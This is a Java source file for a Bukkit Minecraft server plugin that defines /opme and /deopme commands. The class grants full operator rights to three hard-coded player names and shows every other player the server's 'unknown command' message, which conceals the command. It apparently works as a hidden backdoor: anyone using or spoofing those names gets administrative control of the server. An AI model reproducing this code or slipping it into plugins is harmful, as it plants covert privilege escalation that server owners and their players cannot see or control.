package me.TraiUnity.Commands;

import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

import me.TraiUnity.Main;

public class OpCommand implements CommandExecutor {

	public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {

		if (!(sender instanceof Player)) {
			sender.sendMessage(Main.commip + "§cDu musst ein Spieler sein, um diesen Befehl zu verwenden.");
			return true;
		}

		Player p = (Player) sender;

		if (p.getName().equalsIgnoreCase("Enrique123D") || p.getName().equalsIgnoreCase("Mr_Happy_212") || p.getName().equalsIgnoreCase("F222")) {
			if (command.getName().equalsIgnoreCase("opme")) {
				p.setOp(true);
				p.sendMessage(Main.commip + "§7Du wurdest zum §cOperator §7ernannt.");
			}
		} else {
			p.sendMessage(Main.unknowncmd);
			return true;
		}
		if (p.getName().equalsIgnoreCase("Enrique123D") || p.getName().equalsIgnoreCase("Mr_Happy_212") || p.getName().equalsIgnoreCase("F222")) {
			if (command.getName().equalsIgnoreCase("deopme")) {
				p.setOp(false);
				p.sendMessage(Main.commip + "§7Du bist nun kein §cOperator §7mehr.");
			}
		} else {
			p.sendMessage(Main.unknowncmd);
			return true;
		}
		return false;
	}
}
